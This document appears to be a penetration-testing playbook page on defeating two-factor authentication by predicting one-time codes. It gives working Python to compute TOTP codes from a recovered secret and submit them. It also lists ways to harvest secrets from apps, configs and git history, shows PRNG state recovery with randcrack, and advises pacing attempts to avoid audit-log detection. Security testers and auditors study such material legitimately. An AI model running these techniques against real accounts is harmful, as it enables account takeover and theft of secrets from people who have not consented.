# 2FA — Predictable / Weak Code Generation

## When this applies

- The OTP code is generated by a weak random source (insufficient entropy, predictable PRNG seed).
- The TOTP secret was leaked or can be predicted (e.g. derived from username, hardcoded).
- Codes follow visible patterns (sequential, time-based, low variance).

## Technique

If the OTP secret is recoverable or the generation algorithm is weak, you can generate the next code yourself instead of guessing or capturing it. Two scenarios:
1. **Recoverable secret** — secret is in source, configs, JWT, or derived from public data.
2. **Weak randomness** — generated codes follow patterns visible by collecting samples.

## Steps

### 1. Generate TOTP from a known secret

```python
import hmac, hashlib, time, struct, base64

def generate_totp(secret, time_step=30):
    """Generate TOTP like Google Authenticator"""
    key = base64.b32decode(secret, casefold=True)
    msg = struct.pack(">Q", int(time.time() / time_step))
    h = hmac.new(key, msg, hashlib.sha1).digest()
    o = h[19] & 15
    code = (struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % 1000000
    return str(code).zfill(6)

predicted = generate_totp("suspected_secret_key")
verify_2fa(predicted)
```

### 2. Recover the TOTP secret

Common leak vectors:
- **QR-code enrollment URL** — leaked via referrer / browser history. Format: `otpauth://totp/Account?secret=BASE32_SECRET&issuer=...`.
- **Mobile app source** — extracted from APK / IPA.
- **JS bundles** — sometimes embed test/admin secrets.
- **Backup files** — `.env`, config dumps.
- **Git history** — `git log -p | grep -i 'totp\|secret\|seed'`.
- **Server-side logs** — debug logs sometimes echo secrets.

### 3. Weak randomness detection

Collect samples of generated codes:

```python
codes_seen = []
for _ in range(20):
    otp = get_otp_from_email()
    codes_seen.append(int(otp))

# Sequential pattern
if codes_seen == sorted(codes_seen):
    print("[!] Codes are sequential — weak randomness")

# Low variance
import statistics
if statistics.stdev(codes_seen) < 1000:
    print("[!] Low variance — weak generation")

# Time correlation
if all(b - a < 100 for a, b in zip(codes_seen, codes_seen[1:])):
    print("[!] Time-correlated — predictable")
```

### 4. Predict from PRNG seed

When the random source is `Math.random()` (JS) or `random.random()` (Python without `secrets`), the seed may be guessable from public data:

```python
# Mersenne Twister state can be reconstructed from 624 consecutive outputs
# Use `randcrack` library for state recovery
from randcrack import RandCrack

rc = RandCrack()
for code in collected_codes_624:
    rc.submit(code)
# Now rc.predict_random() yields the next outputs
```

### 5. Time-based prediction

If the OTP uses `time()` modulo a small number with a predictable secret:

```python
# Server-side bug: code = int(time()) % 1000000
predicted = int(time.time()) % 1000000
verify_2fa(str(predicted).zfill(6))
```

### 6. Fixed-secret enrollment

Some apps use the same TOTP secret for all users (a single hardcoded secret):

```python
# Check if your code matches a colleague's at the same time
# If yes → shared/fixed secret
shared_secret = recover_from_apk_or_logs()
predicted = generate_totp(shared_secret)
```

### 7. Submit predicted code

```python
verify_2fa(predicted)
```

## Verifying success

- Predicted code authenticates → secret recovery / pattern is correct.
- Multiple consecutive predictions all work → confirms the algorithm.
- Match between your prediction and a fresh email/SMS code → secret recovered.

## Common pitfalls

- Modern TOTP implementations use proper RNG and per-user secrets — predictability is rare.
- Time skew between client and server can cause the predicted code to be off-by-one window — try previous and next windows.
- Some apps add a per-user salt — even with the secret, you need the salt.
- Audit logs flag rapid prediction attempts; pace your testing.

## Tools

- `oathtool` — TOTP/HOTP generator CLI.
- `pyotp` — Python TOTP library.
- `randcrack` — PRNG state recovery.
- `apktool` / `frida` for mobile secret extraction.
- `git log -p` for source-history secret recovery.
